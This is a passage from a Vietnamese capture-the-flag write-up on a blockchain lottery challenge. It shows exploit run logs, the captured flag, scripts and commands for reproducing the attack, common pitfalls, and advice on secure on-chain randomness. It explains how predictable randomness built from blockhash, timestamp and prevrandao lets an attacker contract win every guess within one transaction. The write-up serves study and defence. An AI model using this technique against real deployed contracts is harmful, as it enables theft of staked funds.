setup 0xa7698A8397B10220d2A71EC85169f2f766CEeeA5 lottery 0xad5c9e2c6e9D82d286f06bF9503eEc7b7Ae228a8
isSolved (before) = False

=== Đường A : Attack.sol ===
  deploy Attack: 0x4e6acf1709Ed89b1271655439eb4bD8e89F328Ea gas 172194
  pwn() tx gas 120647 | target 10 lần: [65, 65, 65, 65, 65, 65, 65, 65, 65, 65]
  correct: 10/10 (all=True)
  streaks[0x4e6acf...F328Ea] = 10 | winner = 0x4e6acf...F328Ea

=== Đường B : AttackAlt.sol ===
  deploy AttackAlt: 0x73686468822f7317C6946E1F7e0F0E8a1ee9aBc2 gas 152358
  pwn() tx gas 112421 | target 10 lần: [87, 87, 87, 87, 87, 87, 87, 87, 87, 87]
  correct: 10/10 (all=True)
  streaks[0x73686468822f7317C6946E1F7e0F0E8a1ee9aBc2] = 10 | winner = 0x73686468822f7317C6946E1F7e0F0E8a1ee9aBc2

isSolved (after) = True
[nc action 3] CSS{U5E_4_R4ND0M_FUNCT10N}
```

Chú ý: hai đường dùng **hai block khác nhau** nên target khác nhau (`65` vs `87`), nhưng trong mỗi lần thì
**cả 10 target giống hệt nhau** — đó là bằng chứng trực tiếp cho luận điểm ở mục 2.5.

Flag nộp:

```
CSSCTF{CSS{U5E_4_R4ND0M_FUNCT10N}}
```

---

## 7. Script & lệnh tái lập

```
Downloads/CSSCTF/BLOCKCHAIN/
├── Lottery.sol          # đề cho (contract mục tiêu)
├── Setup(1).sol         # đề cho (== Setup.sol của bài Lottery)
├── Attack.sol           # ĐƯỜNG A: tự tính lại keccak(blockhash, ts, difficulty)
├── AttackAlt.sol        # ĐƯỜNG B: gọi thẳng lottery.random() rồi đoán
├── Probe.sol            # đọc ngược block.difficulty/blockhash để đối chiếu offline
├── lot_launch.py        # nc: kill + launch, parse rpc/pk/setup -> lot_cfg.json
├── lot_solve.py         # deploy 2 attacker, bắn pwn(), verify streak/isSolved, lấy flag
├── exp_predict.py       # thí nghiệm: EOA tính trước có chơi được không? (kết quả: không)
├── exp_retro.py         # verify lại target từ event Guessed + dữ liệu block
├── lottery.abi          # ABI tay (gồm cả event Guessed)
├── setup.abi
├── out/                 # abi/bin Attack (đường A)
├── out_alt/             # abi/bin AttackAlt (đường B)
└── out_probe/           # abi/bin Probe
```

```bash
# 1) môi trường (venv nên đặt ở ~/.venvs để không bị xoá khi reboot /tmp)
python3 -m venv ~/.venvs/ctf && ~/.venvs/ctf/bin/pip install web3
npm i -g solc                                  # -> solcjs

# 2) compile
cd ~/Downloads/CSSCTF/BLOCKCHAIN
solcjs --abi --bin --optimize -o out        Attack.sol
solcjs --abi --bin --optimize -o out_alt    AttackAlt.sol
solcjs --abi --bin --optimize -o out_probe  Probe.sol

# 3) lấy instance (ticket = tên team, case-sensitive) — script tự kill instance cũ trước
~/.venvs/ctf/bin/python lot_launch.py <TEN_TEAM>

# 4) khai thác + verify on-chain (assert streak == 10 và isSolved() == True)
~/.venvs/ctf/bin/python lot_solve.py

# 5) thí nghiệm phụ (tuỳ chọn): vì sao EOA không tính trước được + verify lại target
~/.venvs/ctf/bin/python exp_predict.py
~/.venvs/ctf/bin/python exp_retro.py

# 6) lấy flag
printf '3\n<TEN_TEAM>\n' | nc 34.116.80.78 31338
```

---

## 8. Bẫy / lỗi hay gặp & bài học

**Bẫy của đề**

1. **"Ten wins in a row"** nghe như phải đoán 10 số khác nhau → thực tế cả 10 lần trong cùng 1 tx có
   **cùng một target**; chỉ cần đúng **một** phép tính.
2. **`random()` là `public view`** → vừa là oracle cho attacker (đường B), vừa khiến nhiều người tưởng
   "view thì không dùng được để gọi từ contract" — dùng bình thường.
3. **`block.difficulty` ≠ field `difficulty` của RPC.** Trên chain post-merge, contract nhận `prevrandao`
   (= `mixHash`). Verify offline mà dùng nhầm field này thì ra sai và rất dễ kết luận sai rằng
   "contract đã bị sửa".
4. **`blockhash(block.number - 1)`** là hash của **block cha**, không phải hash của block đang chạy —
   khi `eth_call` chạy ở context `latest`, `block.number` = số block head và `blockhash(n-1)` = hash của
   head **trừ 1**. (Lỗi này tôi đã mắc trong lần tính tay đầu tiên khiến phép so khớp không trùng.)
5. Ticket (tên team) sai → launcher không cho launch/không trả flag; instance **tự huỷ sau 30 phút**,
   và mỗi ticket chỉ được **1 instance** (`An instance is already running!` ⇒ chọn `2` để kill trước).

**Lỗi kỹ thuật đã gặp khi viết script**

- `web3.py v8`: **không** thêm `gasPrice` vào dict của `build_transaction()` (đã có EIP-1559 fields) —
  thêm vào sẽ lỗi `TypeError: Unknown kwargs: ['gasPrice']`. Tx tự dựng tay (self-transfer) thì phải tự
  điền `maxFeePerGas`/`maxPriorityFeePerGas` (hoặc `gasPrice`), không thì `eth_account` báo thiếu field.
- `web3.exceptions.NoABIEventsFound` khi đọc event `Guessed`: ABI tay thiếu entry event ⇒ phải thêm
  `{"name":"Guessed","type":"event",...}` mới `process_receipt()`/`get_logs()` được.
- Luôn assert `receipt.status == 1` (đề bài này không revert, nhưng thói quen này cứu ở các bài khác).
- `/tmp` bị xoá khi VM reboot ⇒ đặt venv ở `~/.venvs/ctf`, còn config instance thì ghi vào thư mục
  workspace (`lot_cfg.json`), không để `/tmp`.
- Compile `Setup(1).sol` bằng `solcjs` trực tiếp dễ lỗi đường dẫn import; ABI cần dùng (`lottery()`,
  `isSolved()`, `streaks()`, `random()`, `guess()`, event `Guessed`) chỉ vài entry nên viết tay ABI gọn hơn.

**Bài học chung (cho cả 2 chiều)**

- **Không bao giờ** dùng `blockhash` / `timestamp` / `prevrandao` / `block.number` làm nguồn ngẫu nhiên cho
  giá trị có thưởng. Trong cùng transaction, mọi dữ liệu này đều **hiển thị công khai với caller**, nên
  contract tấn công "đọc" được kết quả trước khi đặt cược. `prevrandao` còn bị validator ảnh hưởng.
- Cần randomness thật: **commit–reveal** (cam kết hash trước, mở sau), **Chainlink VRF**, hoặc ký số
  off-chain (như VRF/attestation). Trường hợp đơn giản thì dùng `blockhash(block.number - k)` với
  `k ≥ 2` + hai phase khác block, chứ **không** dùng trong cùng block.
- Về phía solver: "điều kiện liên tiếp N lần" trong cùng một block = **một** lần tính đúng, lặp N lần
  trong cùng tx.

---

**Tóm tắt 1 câu:** `random()` không hề ngẫu nhiên vì nó chỉ ghép `blockhash(n-1) ‖ timestamp ‖ prevrandao`
— mà cả ba đều cố định trong suốt transaction, nên một contract tự viết gọi `guess()` 10 lần trong **cùng
một tx** (mỗi lần truyền `keccak256(...)%100` tự tính, hoặc gọi luôn `lottery.random()`) sẽ thắng 10/10 và
chiếm `winner`.
